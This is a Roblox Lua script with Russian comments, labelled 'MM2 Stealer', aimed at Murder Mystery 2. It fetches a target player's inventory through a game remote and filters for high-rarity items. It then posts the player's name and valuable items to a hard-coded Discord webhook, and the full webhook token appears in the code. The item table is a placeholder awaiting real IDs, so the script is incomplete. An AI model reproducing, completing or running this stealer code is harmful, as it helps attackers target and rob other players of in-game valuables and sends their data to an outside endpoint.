local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local plr = Players.LocalPlayer -- ИСПРАВЛЕНО

getgenv().user = "MM2danya7"
local webhook = "https://discord.com/api/webhooks/1415660439702081587/f-WR6U-AmmoTFBPnxXlBqWKaelol6TsPDDMmmGSh0yKjUi6gzefqilg1se3M3mtl1AjS"

-- Функция для безопасной отправки вебхука
local function SendWebhookRequest(embedData)
    local headers = {
        ["Content-Type"] = "application/json"
    }

    local data = {
        ["embeds"] = {embedData}
    }

    local success, response = pcall(function()
        local body = HttpService:JSONEncode(data)
        
        if request then
            return request({
                Url = webhook,
                Method = "POST",
                Headers = headers,
                Body = body
            })
        else
            return HttpService:PostAsync(webhook, body, Enum.HttpContentType.ApplicationJson, false)
        end
    end)
    
    return success, response
end

-- Получаем данные профиля
local targetPlayer = Players:FindFirstChild(user)
if targetPlayer then
    print("Найден игрок:", targetPlayer.Name)
    local success, profileData = pcall(function()
        return ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(targetPlayer)
    end)
    
    if success and profileData then
        print("Данные профиля получены успешно")
        
        -- Таблицы для фильтрации предметов
        local rarityTable = {"Common", "Uncommon", "Rare", "Epic", "Legendary", "Godly", "Chroma"}
        local min_rarityindex = 5 -- Godly и выше
        
        -- База данных предметов (ДОБАВЬТЕ РЕАЛЬНЫЕ ID!)
        local database = {
            [1] = {ItemName = "RedLuger", Rarity = "Godly"},
            -- ДОБАВЬТЕ ОСТАЛЬНЫЕ ПРЕДМЕТЫ ЗДЕСЬ!
        }
        
        -- Определение предметов для отправки
        local send_wpn = {} -- ИСПРАВЛЕНО (без точки)
        for dataid, amount in pairs(profileData.Weapons.Owned) do
            print("Предмет ID:", dataid, "Количество:", amount)
            local itemInfo = database[dataid]
            if itemInfo then
                local rarityIndex = table.find(rarityTable, itemInfo.Rarity)
                if rarityIndex and rarityIndex >= min_rarityindex then
                    table.insert(send_wpn, {
                        DataID = itemInfo.ItemName,
                        Rarity = itemInfo.Rarity,
                        Amount = amount
                    })
                end
            else
                print("Предмет с ID", dataid, "не найден в базе данных")
            end
        end

        print("Найдено предметов для отправки:", #send_wpn)
        
        if #send_wpn > 0 then
            local function formatItems(items)
                local str = ""
                for _, item in ipairs(items) do
                    str = str .. string.format("%s (x%s) - %s\n", item.DataID, item.Amount, item.Rarity)
                end
                if str == "" then str = "None" end
                return str
            end

            local embedData = {
                ["title"] = "MM2 Stealer",
                ["color"] = 0x0663EE,
                ["fields"] = {
                    {name = "Username", value = targetPlayer.Name, inline = true},
                    {name = "Items", value = formatItems(send_wpn), inline = false}
                },
                ["footer"] = {["text"] = "mm2 by vexadez"}
            }

            local success, response = SendWebhookRequest(embedData)
            if success then
                print("Webhook отправлен успешно!")
            else
                warn("Ошибка отправки webhook:", response)
            end
        else
            print("Нет предметов для отправки")
        end
    else
        warn("Не удалось получить данные профиля")
    end
else
    print("Игрок", user, "не найден")
end
